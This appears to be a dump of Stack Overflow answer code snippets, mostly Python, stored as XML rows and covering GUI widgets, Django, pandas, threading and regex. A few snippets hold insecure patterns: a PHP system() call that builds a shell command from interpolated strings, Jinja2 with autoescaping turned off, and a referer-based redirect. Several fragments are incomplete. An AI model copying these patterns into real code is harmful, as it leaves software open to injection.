pointListBox.setHeaderItem(header)   #Another alternative is setHeaderLabels(["Tree","First",...])

root = QtGui.QTreeWidgetItem(pointListBox, ["root"])
A = QtGui.QTreeWidgetItem(root, ["A"])
barA = QtGui.QTreeWidgetItem(A, ["bar", "i", "ii"])
bazA = QtGui.QTreeWidgetItem(A, ["baz", "a", "b"])


pointListBox.show()
sys.exit(app.exec_())
</snippet></ROW><ROW><id>11980701</id><snippet>barA = QtGui.QTreeWidgetItem(A, ["bar", "i", "ii"])</snippet></ROW><ROW><id>11980701</id><snippet>barA = QtGui.QTreeWidgetItem(A)
barA.setText(0,"bar")
barA.setText(1,"i")
barA.setText(2,"ii")
</snippet></ROW><ROW><id>11980742</id><snippet>{{decimal_field|floatformat}}</snippet></ROW><ROW><id>11981214</id><snippet>pack</snippet></ROW><ROW><id>11981214</id><snippet>Canvas.create_window()</snippet></ROW><ROW><id>11981214</id><snippet># ... snip ...
button1 = Button(self, text = "Quit", command = self.quit, anchor = W)
button1.configure(width = 10, activebackground = "#33B5E5", relief = FLAT)
button1_window = canvas1.create_window(10, 10, anchor=NW, window=button1)
</snippet></ROW><ROW><id>11981214</id><snippet>(10, 10)</snippet></ROW><ROW><id>11981214</id><snippet>window</snippet></ROW><ROW><id>11981379</id><snippet>__init__()</snippet></ROW><ROW><id>11981379</id><snippet>None</snippet></ROW><ROW><id>11981379</id><snippet>__new__()</snippet></ROW><ROW><id>11981808</id><snippet>__unicode__</snippet></ROW><ROW><id>11981808</id><snippet>class MyModelChoiceField(ModelChoiceField):
    def label_from_instance(self, obj):
        return "My Object #%i" % obj.id
</snippet></ROW><ROW><id>11982120</id><snippet>title</snippet></ROW><ROW><id>11982120</id><snippet>str</snippet></ROW><ROW><id>11982120</id><snippet>Unicode</snippet></ROW><ROW><id>11982120</id><snippet>encoding='utf8'</snippet></ROW><ROW><id>11982120</id><snippet>create_engine</snippet></ROW><ROW><id>11982120</id><snippet>mysql://me@myserver/mydatabase?charset=utf8</snippet></ROW><ROW><id>11982602</id><snippet>class Support(pd.Series):
    def __new__(cls, *args, **kwargs):
        arr = Series.__new__(cls, *args, **kwargs)
        return arr.view(Support)

    def supportMethod1(self):
        print 'I am support method 1'       
    def supportMethod2(self):
        print 'I am support method 2'
</snippet></ROW><ROW><id>11982602</id><snippet>s.ix[:5] 
s.cumsum()
</snippet></ROW><ROW><id>11982602</id><snippet>s.ix[:5]</snippet></ROW><ROW><id>11982739</id><snippet>class Congressman(ndb.model):
    ...
</snippet></ROW><ROW><id>11982739</id><snippet>Congressman</snippet></ROW><ROW><id>11982739</id><snippet>for congressman_info in j['objects']:
    congressman = Congressman(gender=congresmman_info['gender_label'],
                              name=congressman_info['name_no_details'], ...)
    congressman.put()
</snippet></ROW><ROW><id>11982843</id><snippet>In [5]: a.reset_index().merge(b, how="left").set_index('index')
Out[5]:
       col1  to_merge_on  col2
index
a         1            1     1
b         2            3     2
c         3            4   NaN
</snippet></ROW><ROW><id>11983055</id><snippet>setdefault</snippet></ROW><ROW><id>11983055</id><snippet>.name</snippet></ROW><ROW><id>11983055</id><snippet>.append()</snippet></ROW><ROW><id>11983055</id><snippet>for element in iterable:
    values.setdefault(element.name, []).append(element)
</snippet></ROW><ROW><id>11983055</id><snippet>setdefault</snippet></ROW><ROW><id>11983055</id><snippet>collections.defaultdict</snippet></ROW><ROW><id>11983055</id><snippet>from collections import defaultdict
values = defaultdict(list)
for element in iterable:
    values[element.name].append(element)
</snippet></ROW><ROW><id>11983055</id><snippet>setdefault</snippet></ROW><ROW><id>11983055</id><snippet>itertools.groupby</snippet></ROW><ROW><id>11983055</id><snippet>from itertools import groupby
from operator import attrgetter
values = { name: list(elements) for name,elements in
    groupby(elements, attrgetter('name')) }
</snippet></ROW><ROW><id>11983074</id><snippet>plot1, = plt.plot(a,b)
plot2, = plt.plot(a,c)
</snippet></ROW><ROW><id>11983234</id><snippet>def is_name(x):
  return # if x is a name or not
</snippet></ROW><ROW><id>11983234</id><snippet>defaultdict</snippet></ROW><ROW><id>11983234</id><snippet>from collections import defaultdict

def do_it(source):
  dd = defaultdict(lambda: [])
  for item in sum(source, []): # just use your favourite flattening method here
    if is_name(item):
      name = item
    else:
      dd[name].append(item)
  return [[k]+v for k,v in dd.items()]

for s in do_it(l):
  print s
</snippet></ROW><ROW><id>11983234</id><snippet>import itertools 

def do_it(source):
  name, items = None, []
  for item in itertools.chain.from_iterable(source):
    if is_name(item):
      if name: 
        yield [name] + items
        name, items = None, []
      name = item
    else:
      items.append(item)
  yield [name] + items
</snippet></ROW><ROW><id>11983330</id><snippet>pysqlite</snippet></ROW><ROW><id>11983330</id><snippet>import sqlite3</snippet></ROW><ROW><id>11983330</id><snippet>pysqlite</snippet></ROW><ROW><id>11983399</id><snippet>appointments.append((select_meeting.meeting_datetime,
                     select_meeting.meeting_datetime + timedelta(minutes = getm)))
</snippet></ROW><ROW><id>11983616</id><snippet>s_</snippet></ROW><ROW><id>11983616</id><snippet>&gt;&gt;&gt; np.s_[2::2]
slice(2, None, 2)
</snippet></ROW><ROW><id>11983616</id><snippet>s_ = Foo()</snippet></ROW><ROW><id>11983616</id><snippet>s_</snippet></ROW><ROW><id>11983847</id><snippet>:</snippet></ROW><ROW><id>11983847</id><snippet>c:/</snippet></ROW><ROW><id>11983847</id><snippet>timestampWithoutMilli()</snippet></ROW><ROW><id>11983847</id><snippet>-</snippet></ROW><ROW><id>11983847</id><snippet>:</snippet></ROW><ROW><id>11983847</id><snippet>.replace()</snippet></ROW><ROW><id>11984072</id><snippet>form = cgi.FieldStorage()
sTestMode = form.getfirst('sTestMode')
sTestMode = cgi.escape(sTestMode)  # Avoid script injection escaping the user input
</snippet></ROW><ROW><id>11984072</id><snippet>var filename = '/url/to/your/script';
$.ajax({
  url: filename + '?sTestMode=' + sTestMode,
  type: 'GET'
});
</snippet></ROW><ROW><id>11984072</id><snippet>/url/to/your/script?sTestMode=something_funny</snippet></ROW><ROW><id>11984272</id><snippet>response_headers = [(u'Content-type',u'text/plain')]
</snippet></ROW><ROW><id>11984419</id><snippet>expr = r'((?&lt;=&lt;div)|(?&lt;=&lt;p))[ ]+.*?&gt;'
html_text = re.sub(expr,'&gt;',html_text)
</snippet></ROW><ROW><id>11984419</id><snippet>expr = r' (style|align|myStyleTag)=".*?"'
</snippet></ROW><ROW><id>11984419</id><snippet>expr = "("
for i in range(1,8): ## or whatever the max/min tag lengths are
    expr += "(?&lt;=&lt;[a-zA-Z]{" + str(i) + "})|"
expr = expr[:-1] + ")[ ]+.*?&gt;"
</snippet></ROW><ROW><id>11984633</id><snippet>storage = messages.get_messages(request)
for message in storage:
    do_something_with(message)
</snippet></ROW><ROW><id>11984633</id><snippet>messages.add_message(request, messages.INFO, 'An info.')
messages.add_message(request, messages.SUCCESS, 'An success.')
</snippet></ROW><ROW><id>11984760</id><snippet>class PrintThread(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def printfiles(self, p):
        for path, dirs, files in os.walk(p):
            for f in files:
                print(f, file=output)

    def run(self):
        while True:
            result = self.queue.get()
            self.printfiles(result)
            self.queue.task_done()

class ProcessThread(threading.Thread):
    def __init__(self, in_queue, out_queue):
        threading.Thread.__init__(self)
        self.in_queue = in_queue
        self.out_queue = out_queue

    def run(self):
        while True:
            path = self.in_queue.get()
            result = self.process(path)
            self.outqueue.put(result)
            self.in_queue.task_done()

    def process(self, path):
        #Do the processing job here

pathqueue = Queue.Queue()
resultqueue = Queue.Queue()
paths = getThisFromSomeWhere()

output = codecs.open('file', 'a')

# spawn threads to process
for i in range(0, 5):
    t = ProcessThread(pathqueue, resultqueue)
    t.setDaemon(True)
    t.start()

# spawn threads to print
t = PrintThread(resultqueue)
t.setDaemon(True)
t.start()

# add paths to queue
for path in paths:
    pathqueue.put(path)

# wait for queue to get empty
pathqueue.join()
resultqueue.join()
</snippet></ROW><ROW><id>11984774</id><snippet>timezone</snippet></ROW><ROW><id>11984774</id><snippet>timezone</snippet></ROW><ROW><id>11984774</id><snippet>TZ  timezone
EST 5*60*60
GMT 0*60*60
JST -9*60*60
MET -1*60*60
MST 7*60*60
PST 8*60*60
</snippet></ROW><ROW><id>11985661</id><snippet>cursor = con.cursor()       
cursor.execute("SELECT * FROM traffic")

#Retrieves data from SQL
rows = cursor.fetchall()  

Month = list()
Traffic = list()

for row in rows:
    Month.append(row['Month'])          # guesswork - what does a row look like?
    Traffic.append(row['Traffic'])
</snippet></ROW><ROW><id>11985661</id><snippet>&gt;&gt;&gt; r.plot(Month,Traffic)
rpy2.rinterface.NULL
</snippet></ROW><ROW><id>11985661</id><snippet>&gt;&gt;&gt; r.plot(Month,Traffic,type="l")
rpy2.rinterface.NULL
</snippet></ROW><ROW><id>11985661</id><snippet>&gt;&gt;&gt; r.plot(Month,Traffic,type="l",xlab="Month",ylab="Traffic")
</snippet></ROW><ROW><id>11985752</id><snippet>from urllib2 import Request, urlopen, URLError

url = raw_input('enter something')
req = Request(url)
try:
    response = urlopen(req)
except URLError, e:
    if hasattr(e, 'reason'):
        print 'We failed to reach a server.'
        print 'Reason: ', e.reason
    elif hasattr(e, 'code'):
        print 'The server couldn\'t fulfill the request.'
        print 'Error code: ', e.code
else:
    print 'URL is good!'
</snippet></ROW><ROW><id>11985752</id><snippet>python test.py 
enter somethinghttp://www.google.com
URL is good!
</snippet></ROW><ROW><id>11985752</id><snippet>python test.py 
enter somethinghttp://www.google.com/bad
The server couldn't fulfill the request.
Error code:  404
</snippet></ROW><ROW><id>11985790</id><snippet>?:</snippet></ROW><ROW><id>11985790</id><snippet>import re
print re.findall('(.(foo))', "Xfoo")   # [('Xfoo', 'foo')]
print re.findall('(.(?:foo))', "Xfoo") # ['Xfoo']
</snippet></ROW><ROW><id>11985811</id><snippet>get_jinja2</snippet></ROW><ROW><id>11985811</id><snippet>factory</snippet></ROW><ROW><id>11985811</id><snippet>@webapp2.cached_property
def jinja2(self):
    # Returns a Jinja2 renderer cached in the app registry, with no autoescaping.
    return jinja2.get_jinja2(lambda app: jinja2.Jinja2(app=app,config={'environment_args':{'autoescape':False}}))
</snippet></ROW><ROW><id>11985930</id><snippet>x264 -p 1 --stats file1.log ...
x264 -p 1 --stats file2.log ...
x264 -p 1 --stats file2.log ...
</snippet></ROW><ROW><id>11986197</id><snippet>Queue</snippet></ROW><ROW><id>11986197</id><snippet>def str_to_int(arg, queue):
    result = int(arg)
    queue.put({arg: result})

def combine():
    arguments = ('111', '222', '333')
    q = Queue.Queue()
    threads = []

    for argument in arguments:
        t = Thread(target=str_to_int, args=(argument, q))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    return [q.get() for _ in xrange(len(arguments))]
</snippet></ROW><ROW><id>11986396</id><snippet>import time
import sys

print 'this is a text',
sys.stdout.flush()

time.sleep(1)
print '\x1b[80D'+'\x1b[K'+'Second text',
sys.stdout.flush()
</snippet></ROW><ROW><id>11986396</id><snippet>stdout</snippet></ROW><ROW><id>11986396</id><snippet>def mylog(text):
    logging.info(text)
    print '\x1b[80D' + '\x1b[K'+ text,
    sys.stdout.flush()
</snippet></ROW><ROW><id>11986396</id><snippet>import logging
# create console handler
ch = logging.StreamHandler()
# create formatter
formatter = logging.Formatter('\x1b[80D\x1b[1A\x1b[K%(message)s')
# add formatter to console handler
ch.setFormatter(formatter)
# add console handler to logger
logger.addHandler(ch)
</snippet></ROW><ROW><id>11986537</id><snippet>def remove_items(d, *items):
    """
    Return dictionary copy with some items removed.
    """
    return { a: b for a, b in d.iteritems() if a not in items }

print { x: remove_items(y, 'private') for x, y in out.iteritems() }
</snippet></ROW><ROW><id>11986568</id><snippet>StringField</snippet></ROW><ROW><id>11986568</id><snippet>proxy_class</snippet></ROW><ROW><id>11986568</id><snippet>ImageField</snippet></ROW><ROW><id>11986692</id><snippet>&gt;&gt;&gt; def noisy(n):
...   for i in range(n):
...     print i
...     yield i
... 
&gt;&gt;&gt; def test(*args):
...   print "in test"
...   for arg in args:
...     print arg
... 
&gt;&gt;&gt; test(*noisy(4))
0
1
2
3
in test
0
1
2
3
</snippet></ROW><ROW><id>11986877</id><snippet>from xml.etree.ElementTree import XML
single_item_data = XML("&lt;stuff&gt;1 2 3&lt;/stuff&gt;").text
</snippet></ROW><ROW><id>11986877</id><snippet>from xml.etree.ElementTree import XML

test_input_xml = '''
&lt;lotsOfStuff&gt;
   &lt;stuff&gt;
   1
   2
   3
   4
   &lt;/stuff&gt;

   &lt;stuff&gt;
   5
   7
   8
   9
   &lt;/stuff&gt;
&lt;/lotsOfStuff&gt;
'''

test_input = XML(test_input_xml)
stuffs = test_input.findall("stuff")

for stuff in stuffs:
   element_text = stuff.text
   print element_text
</snippet></ROW><ROW><id>11987104</id><snippet>def helloFunc():
    pass

hello_func = helloFunc
</snippet></ROW><ROW><id>11987104</id><snippet>hello_func</snippet></ROW><ROW><id>11987104</id><snippet>helloFunc = hello_func
</snippet></ROW><ROW><id>11987104</id><snippet>import module</snippet></ROW><ROW><id>11987104</id><snippet>import module.submodule as module</snippet></ROW><ROW><id>11987104</id><snippet>inspect</snippet></ROW><ROW><id>11987104</id><snippet>import inspect
import re
def underscore_to_camel(modinput,modadd):
    """
       Find all functions in modinput and add them to modadd.  
       In modadd, all the functions will be converted from name_with_underscore
       to camelCase
    """
    functions = inspect.getmembers(modinput,inspect.isfunction)
    for f in functions:
        camel_name = re.sub(r'_.',lambda x: x.group()[1].upper(),f.__name__)
        setattr(modadd,camel_name,f)
</snippet></ROW><ROW><id>11987516</id><snippet>def f1():
    x = { 'value': 5 }
    def f2():
        x['value'] += 1
</snippet></ROW><ROW><id>11987591</id><snippet>for file in def_scons_exe:
    if file == item[-4:]:
        filelist.append(filepath)
</snippet></ROW><ROW><id>11987591</id><snippet>for file in def_scons_exe:
    if file == item[-len(file):]:
        filelist.append(filepath)
        break
</snippet></ROW><ROW><id>11987591</id><snippet>os.walk</snippet></ROW><ROW><id>11987591</id><snippet>os.access([path], os.X_OK)</snippet></ROW><ROW><id>11987591</id><snippet>//Generates a list of all files in `root_dir` matching extensions in `ext_list`
def get_files_etx(root_dir, ext_list):
    return [path for dirfiles in [[filedata[0] + os.sep + filename for filename in filedata[1]] for filedata in [(root, files) for root, _, files in os.walk(root_dir)]] for path in dirfiles if path.split(".")[-1] in ext_list]

//Generates a list of all executable files in `root_dir`
def get_files_exe(root_dir):
    return [path for dirfiles in [[filedata[0] + os.sep + filename for filename in filedata[1]] for filedata in [(root, files) for root, _, files in os.walk(root_dir)]] for path in dirfiles if os.access(path, os.X_OK)]

get_files_etx("/home/user/Documents", ["exe", "sh"])
get_files_exe("/home/user/Documents")
</snippet></ROW><ROW><id>11987767</id><snippet>fn = 'cooltemp.dat'
c_values = loadtxt(fn,unpack=True,usecols=[1])

I=[]
for c in c_values: #can iterate over numpy arrays directly.  No need for `range(len(...))`

    # equation
    #eqn = 2*x*c[n] #This doesn't work, x not defined yet.

    # integrate 
    result,error = integrate.quad(lambda x: 2*c*x, 0, 1)

    I.append(result)

I = array(I)
</snippet></ROW><ROW><id>11987767</id><snippet>lambda</snippet></ROW><ROW><id>11987767</id><snippet>my_func = lambda x: 2*x
</snippet></ROW><ROW><id>11987767</id><snippet>def my_func(x):
    return 2*x
</snippet></ROW><ROW><id>11987767</id><snippet>f(x,c):
   return 2*x*c

#...snip...
integral, error = integrate.quad(f, 0, 1, args=(c,) )
</snippet></ROW><ROW><id>11987961</id><snippet># main: axis; olocs: locations list; ocols: location colours
def overlay_labels(main, olocs, ocols):
    # Append the overlay labels as ticks
    main.yaxis.set_ticks(np.append(main.yaxis.get_ticklocs(), olocs))

    # Perform generic formatting to /all/ ticks
    # [...]

    labels  = reversed(main.yaxis.get_ticklabels())
    markers = reversed(main.yaxis.get_ticklines()[1::2]) # RHS ticks only
    glines  = reversed(main.yaxis.get_gridlines())
    rocols  = reversed(ocols)

    # Suitably format each overlay tick (colours and lines)
    for label,marker,grid,colour in izip(labels, markers, glines, rocols):
        label.set_color('white')
        label.set_backgroundcolor(colour)
        marker.set_visible(False)
        grid.set_visible(False)
</snippet></ROW><ROW><id>11988034</id><snippet>$parsedString = system("python replace.py '$replaceString' '$replaceTo' '$source'", $retval);</snippet></ROW><ROW><id>11988068</id><snippet>from flask import current_app</snippet></ROW><ROW><id>11988068</id><snippet>current_app.logger.error('panic !!!')</snippet></ROW><ROW><id>11988086</id><snippet>__iadd__</snippet></ROW><ROW><id>11988086</id><snippet>__get__</snippet></ROW><ROW><id>11988086</id><snippet>__get__</snippet></ROW><ROW><id>11988086</id><snippet>__iadd__</snippet></ROW><ROW><id>11988086</id><snippet>@property
def x(self):
    proxy = IProxy(self._x)
    proxy.parent = self
    return proxy

class IProxy(int, object):
    def __iadd__(self, val):
        self.parent.iadd_x(val)
        return self.parent.x
</snippet></ROW><ROW><id>11988161</id><snippet>class Day (db.Model):
    courtday = db.ReferenceProperty(CourtDays)
    startTime = db.TimeProperty()
    endTime = db.TimeProperty()
    startTimeLunch = db.TimeProperty()
    endTimeLunch = db.TimeProperty()
    name = db.StringProperty()

days = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"]
for dayname in days:
  newday = Day(name=dayname)
  newday.put()
</snippet></ROW><ROW><id>11988198</id><snippet>stdin</snippet></ROW><ROW><id>11988198</id><snippet>stdout</snippet></ROW><ROW><id>11988198</id><snippet>text = file.read()
text = re.sub(r'[.,:;-_]', '', text)
text = text.upper()
words = re.split(r'\\s+', text)
c = Counter()
c.update(words)
</snippet></ROW><ROW><id>11988198</id><snippet>tr</snippet></ROW><ROW><id>11988198</id><snippet>sed</snippet></ROW><ROW><id>11988378</id><snippet>&lt;span style="color:red"&gt;&lt;b&gt;This is red&lt;/b&gt;&lt;/span&gt;
</snippet></ROW><ROW><id>11988762</id><snippet>?</snippet></ROW><ROW><id>11988762</id><snippet>((\w+)_)?
</snippet></ROW><ROW><id>11988762</id><snippet>(?:(\w+)_)?
</snippet></ROW><ROW><id>11988762</id><snippet>(\w+)_(\w+)_(\w+)_(?:(\w+)_)?(\d)_(\d)_(\w+)\.(\d+)_(\S+)\.fq\.gz
</snippet></ROW><ROW><id>11988785</id><snippet>--nothreading</snippet></ROW><ROW><id>11988785</id><snippet>runserver</snippet></ROW><ROW><id>11988785</id><snippet>python ./manage.py runserver --nothreading ...
</snippet></ROW><ROW><id>11988898</id><snippet>from time import time

time_started = time()
messages_sent = 0.
MAX_PER_SEC = 70

for user in _10000_users:
    msg = generate_message(user)
    if messages_sent / (time() - time_started) &gt;= MAX_PER_SEC:  # Rate condition
        sleep(0.1)
    ses.send_message(msg)
    messages_sent += 1
</snippet></ROW><ROW><id>11989018</id><snippet>m2m_changed</snippet></ROW><ROW><id>11989018</id><snippet>pre_save/post_save</snippet></ROW><ROW><id>11989018</id><snippet>pre_delete/post_delete signals</snippet></ROW><ROW><id>11989136</id><snippet>c = None
a[2:c]
</snippet></ROW><ROW><id>11989136</id><snippet>[]</snippet></ROW><ROW><id>11989136</id><snippet>a = [0, 1, 2, 3]
s = slice(2, None)
a[s]  # equal to a[2:]
</snippet></ROW><ROW><id>11989179</id><snippet>-</snippet></ROW><ROW><id>11989179</id><snippet>gco:</snippet></ROW><ROW><id>11989179</id><snippet>&lt;?xml version="1.0"?&gt;
&lt;note&gt;
    &lt;to&gt;Tove&lt;/to&gt;
    &lt;infoaboutauthor&gt;
      &lt;nestedprofile&gt;
           &lt;aboutme&gt;
               &lt;CharacterString&gt;I am a 10th grader who likes to play ball.&lt;/CharacterString&gt;
          &lt;/aboutme&gt;
      &lt;/nestedprofile&gt;
    &lt;/infoaboutauthor&gt;
    &lt;date&gt;
        &lt;info_date&gt;
            &lt;date&gt;
               &lt;Date&gt;2003-06-13&lt;/Date&gt;
            &lt;/date&gt;
            &lt;datetype&gt;
                &lt;datetype attribute="Value"&gt;
                &lt;/datetype&gt;
            &lt;/datetype&gt;
        &lt;/info_date&gt;
    &lt;/date&gt;
    &lt;from&gt;Jani&lt;/from&gt;
    &lt;heading&gt;Reminder&lt;/heading&gt;
    &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;
  &lt;/note&gt;
</snippet></ROW><ROW><id>11989179</id><snippet># Get the element tree from the file name and not a file object
tree = ElementTree.parse('config.xml')

# Get the root of the tree
root = tree.getroot()

# To get the 'Date' tag and print its text
date_tag = root.find('date').find('info_date').find('date').find('Date')
print date_tag.text

# Get the `aboutme` tag and print its text
about_me_tag = root.find('infoaboutauthor').find('nestedprofile').find('aboutme').find('CharacterString')
print about_me_tag.text
</snippet></ROW><ROW><id>11989179</id><snippet>def replace_in_config(old, new):
    with open('config.xml', 'r') as f:
        text = f.read()

    with open('config.xml', 'w') as f:
        f.write(text.replace(old, new))
</snippet></ROW><ROW><id>11989179</id><snippet>replace_in_config('gco:', '_stripped')
</snippet></ROW><ROW><id>11989179</id><snippet>gco:Date</snippet></ROW><ROW><id>11989179</id><snippet>stripped_Date</snippet></ROW><ROW><id>11989179</id><snippet>replace_in_config('_stripped', 'gco:')
</snippet></ROW><ROW><id>11989179</id><snippet>etree</snippet></ROW><ROW><id>11989210</id><snippet>def login_user(request):
    if request.POST:
        sform = LoginForm(request.POST)
        rform = UserForm()
        if sform.is_valid():
            username = request.POST.get('username')
            password = request.POST.get('password')
            user = authenticate(username = username,password = password)
            if user is not None:
                if user.is_active:
                    login(request,user)
                    return redirect(request.path)
                else:
                    state = "Your account is not active."
                    #or first set the user to is active and then log in 
                    return redirect(req.session['after_login_url'],user = user)
                return render_to_response('home.html',{'state':state,'user':user},context_instance = RequestContext(request))
            else:
                state = "Incorrect Username or Password"
                #sform = LoginForm()
                form = LoginForm()
                return render_to_response('register.html',{'state':state,'sform':sform,'rform':rform,'form':form},context_instance = RequestContext(request))
        else:
            state = "Invalid form"
            dLoginForm = LoginForm()
            rform = PartialSignupForm()
            return render_to_response('register.html',{'sform':sform,'rform':rform,'form':form},context_instance = RequestContext(request))
    else:
        dLoginForm = LoginForm()
        rform = PartialSignupForm()
        req.session['after_login_url'] = req.META.get('HTTP_REFERER')
        return render_to_response('category.html',{'dLoginForm':dLoginForm,'rform':rform},context_instance = RequestContext(request))
</snippet></ROW><ROW><id>11989210</id><snippet>after_login_url</snippet></ROW><ROW><id>11989318</id><snippet>_query</snippet></ROW><ROW><id>11989318</id><snippet>request.route_url('idea', idea='great', _query={'sort':'asc'})
</snippet></ROW><ROW><id>11989396</id><snippet>interlace_markers = existing_markers + new_markers
interlace_markers.sort(key = lambda x: x.marker_number)
</snippet></ROW><ROW><id>11989396</id><snippet>for i,marker in enumerate(interlace_markers):
    marker.marker_number = i+1 #indexing is 1 based instead of zero based
</snippet></ROW><ROW><id>11989578</id><snippet>mytext.replace(r"\r\n", r"\n")
</snippet></ROW><ROW><id>11989618</id><snippet>&gt;&gt;&gt; import itertools
&gt;&gt;&gt; ["".join(perm) for perm in itertools.permutations("abc")]
['abc', 'acb', 'bac', 'bca', 'cab', 'cba']
</snippet></ROW><ROW><id>11989618</id><snippet>itertools</snippet></ROW><ROW><id>11989618</id><snippet>def all_perms(elements):
    if len(elements) &lt;=1:
        yield elements
    else:
        for perm in all_perms(elements[1:]):
            for i in range(len(elements)):
                yield perm[:i] + elements[0:1] + perm[i:]


word = "abc"
print list(all_perms(word))
</snippet></ROW><ROW><id>11989618</id><snippet>itertools</snippet></ROW><ROW><id>11989618</id><snippet>generators</snippet></ROW><ROW><id>11989618</id><snippet>def all_perms(elements):
    if len(elements) &lt;=1:
        return elements
    else:
        tmp = []
        for perm in all_perms(elements[1:]):
            for i in range(len(elements)):
                tmp.append(perm[:i] + elements[0:1] + perm[i:])
        return tmp
</snippet></ROW><ROW><id>11989712</id><snippet>'entries' != 'entires'
</snippet></ROW><ROW><id>11989773</id><snippet>__cmp__</snippet></ROW><ROW><id>11989773</id><snippet>&gt;&gt;&gt; import heapq
&gt;&gt;&gt; class MyObject(object):
...     def __init__(self, val):
...         self.val = val
...     def __cmp__(self, other):
...         return cmp(self.val, other.val)
...         
...     
... 
&gt;&gt;&gt; q = []
&gt;&gt;&gt; heapq.heappush(q, MyObject(50))
&gt;&gt;&gt; heapq.heappush(q, MyObject(40))
&gt;&gt;&gt; heapq.heappush(q, MyObject(30))
&gt;&gt;&gt; heapq.heappush(q, MyObject(20))
&gt;&gt;&gt; heapq.heappush(q, MyObject(200))
&gt;&gt;&gt; obj = heapq.heappop(q)
&gt;&gt;&gt; print obj.val
20
</snippet></ROW><ROW><id>11990159</id><snippet>if start &lt; today18</snippet></ROW><ROW><id>11990189</id><snippet>range()</snippet></ROW><ROW><id>11990189</id><snippet>enumerate()</snippet></ROW><ROW><id>11990189</id><snippet>timeit a = [f(n) for n, _ in enumerate(mlist)]
10000 loops, best of 3: 118 us per loop

timeit a = [f(n) for n in range(len(mlist))]
10000 loops, best of 3: 102 us per loop
</snippet></ROW><ROW><id>11990189</id><snippet>xrange()</snippet></ROW><ROW><id>11990189</id><snippet>timeit a = [f(n) for n in xrange(len(mlist))]
10000 loops, best of 3: 99 us per loop
</snippet></ROW><ROW><id>11990189</id><snippet>xrange()</snippet></ROW><ROW><id>11990189</id><snippet>range()</snippet></ROW><ROW><id>11990189</id><snippet>enumerate()</snippet></ROW><ROW><id>11990518</id><snippet>__slots__</snippet></ROW><ROW><id>11990518</id><snippet>dict</snippet></ROW><ROW><id>11990518</id><snippet>dict</snippet></ROW><ROW><id>11990800</id><snippet>global</snippet></ROW><ROW><id>11990800</id><snippet>&gt;&gt;&gt; math
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
NameError: name 'math' is not defined
&gt;&gt;&gt; def f():
...     global math
...     import math
...
&gt;&gt;&gt; f()
&gt;&gt;&gt; math
&lt;module 'math' from '/usr/local/lib/python2.6/lib-dynload/math.so'&gt;
</snippet></ROW><ROW><id>11990885</id><snippet>a</snippet></ROW><ROW><id>11990885</id><snippet>a</snippet></ROW><ROW><id>11990885</id><snippet>del a</snippet></ROW><ROW><id>11990885</id><snippet>a</snippet></ROW><ROW><id>11990885</id><snippet>__del__</snippet></ROW><ROW><id>11991046</id><snippet> xAxis: {
            categories: [
                'Jan',
                'Feb',
                'Mar',
                'Apr',
                'May',
                'Jun',
                'Jul',
                'Aug',
                'Sep',
                'Oct',
                'Nov',
                'Dec'
            ]
        }
</snippet></ROW><ROW><id>11991046</id><snippet> series: [{
             name: 'Consommations',
            data: normalizeData([[1,5],[9,10],[5,0]])

        }, {
            name: 'Prévisions',
            data: normalizeData([[1,2],[2,4],[5,8]])

        }]
</snippet></ROW><ROW><id>11991046</id><snippet>function normalizeData(data){
  var normalizedData=[];
  var i;
  for(i=0;i&lt;12;i++){
    if(data[i])
        normalizedData[i]=data[i];
    else
        normalizedData[i]=0;
  }
  return normalizedData;
}
</snippet></ROW><ROW><id>11991046</id><snippet>var months=[
                'Jan',
                'Feb',
                'Mar',
                'Apr',
                'May',
                'Jun',
                'Jul',
                'Aug',
                'Sep',
                'Oct',
                'Nov',
                'Dec'
            ];
</snippet></ROW><ROW><id>11991046</id><snippet>function normalizeData(data){
var existingMonths=[];
var normalizedData=[];
var i;
for(i=0;i&lt;data.length;i++){
    var datum=data[i];
    datum[0]=  $.inArray(datum[0],months);
    existingMonths.push(datum[0]);
    normalizedData.push(datum);
}
for(i=0;i&lt; months.length;i++){
    if($.inArray(i,existingMonths)==-1)
        normalizedData.push([i ,0]);
}
return normalizedData;
}
</snippet></ROW><ROW><id>11991046</id><snippet> xAxis: {
            categories: months
        }
</snippet></ROW><ROW><id>11991253</id><snippet>import argparse

parser = argparse.ArgumentParser(description="blah blah blah")
parser.add_argument('-i',default="1",type=int)

args = parser.parse_args([])
print args          # Namespace(i=1)
print type(args.i)  # &lt;type 'int'&gt;
</snippet></ROW><ROW><id>11991253</id><snippet>default</snippet></ROW><ROW><id>11991253</id><snippet>type</snippet></ROW><ROW><id>11991253</id><snippet>Action</snippet></ROW><ROW><id>11991253</id><snippet>#...snip...
parser.add_argument('-d', '--directory', help='directory to check')
args = parser.parse_args()
args.directory = valid(args.directory if args.directory is not None else os.getcwd())
#the following should work too. 
#args.directory = valid(args.directory if args.directory else os.getcwd()) 
</snippet></ROW><ROW><id>11991521</id><snippet>jsonmsg["flow_id"]
jsonmsg["app_src_ip"]
jsonmsg["app_dst_ip"]
</snippet></ROW><ROW><id>11991631</id><snippet>import os
os.system('"C:\Program Files\iOpus\iMacros\iMacros.exe" -macro my_macro.iim')
</snippet></ROW><ROW><id>11991631</id><snippet>import win32com.client
def Hello():
 import win32com.client
 w=win32com.client.Dispatch("imacros")
 w.iimInit("", 1)
 w.iimPlay("Demo\\FillForm")
if __name__=='__main__':
 Hello()
</snippet></ROW><ROW><id>11991638</id><snippet>if CONDITION == True:
    raise ValueError(HELPING_EXPLANATION)
</snippet></ROW><ROW><id>11991638</id><snippet>ValueError('message')</snippet></ROW><ROW><id>11991638</id><snippet>raise ValueError, 'message'</snippet></ROW><ROW><id>11991720</id><snippet>python setup.py</snippet></ROW><ROW><id>11991720</id><snippet>sudo</snippet></ROW><ROW><id>11991720</id><snippet>george$ sudo easy_install pip
george$ sudo pip install virtualenv
george$ sudo pip install virtualenvwrapper
</snippet></ROW><ROW><id>11991720</id><snippet>george$ mkdir ~/Projects
george$ cd ~/Projects
george$ virtualenv myVirtualenv        -- this just creates the environment.
george$ cd myVirtualenv                -- change into the directory
george$ ls                        -- list contents of the direcotry
